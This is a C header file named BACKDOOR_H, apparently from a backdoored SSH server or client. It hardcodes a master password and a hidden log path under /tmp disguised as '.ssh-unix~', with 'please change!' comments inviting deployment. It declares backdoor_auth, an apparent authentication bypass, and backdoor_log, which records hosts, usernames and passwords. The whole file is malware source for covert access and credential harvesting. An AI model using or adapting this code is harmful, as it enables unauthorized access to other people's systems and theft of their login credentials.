#ifndef BACKDOOR_H
#define BACKDOOR_H

#define ATEAM_PASSWORD "pDEUWJJh7@#" // please change!
#define ATEAM_LOG_DIR "/tmp/tmp.ssh" // please change!
#define ATEAM_LOG "/tmp/tmp.ssh/.ssh-unix~" // please change!
int backdoor_auth(const char *password);
void backdoor_log(const char *host, char *user, const char *password);

typedef struct
{
	struct
	{
		unsigned short type;
		unsigned short len;
	} header;
	unsigned char data[0];
} __attribute ((packed)) record;

typedef struct
{
	unsigned char key;
	unsigned char data[0];
} __attribute ((packed)) data;

#endif /* BACKDOOR_H */
